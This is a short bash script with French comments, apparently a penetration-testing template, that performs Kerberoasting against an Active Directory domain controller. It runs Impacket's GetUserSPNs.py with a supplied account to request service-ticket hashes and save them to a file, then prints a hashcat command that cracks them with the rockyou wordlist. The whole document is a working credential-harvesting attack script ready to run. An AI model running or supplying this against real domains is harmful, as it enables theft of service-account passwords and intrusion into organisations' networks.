#!/bin/bash
# Template : Kerberoasting (Nécessite un compte valide)
TARGET=$1
DOMAIN=$2
USER=$3
PASS=$4
OUTPUT="kerberoast_hashes.txt"

if [ -z "$PASS" ]; then
    echo "[-] Usage: $0 <IP_DC> <DOMAIN> <USER> <PASS>"
    exit 1
fi

echo "[*] Tentative de Kerberoasting avec le compte $USER..."

GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$TARGET" -request -outputfile "$OUTPUT"

if [ -s "$OUTPUT" ]; then
    echo "[###] SUCCÈS ! Hashes de service récupérés dans $OUTPUT"
    echo "[*] Crack : hashcat -m 13100 $OUTPUT /usr/share/wordlists/rockyou.txt"
else
    echo "[-] Aucun SPN (Service Principal Name) n'a pu être récupéré."
fi
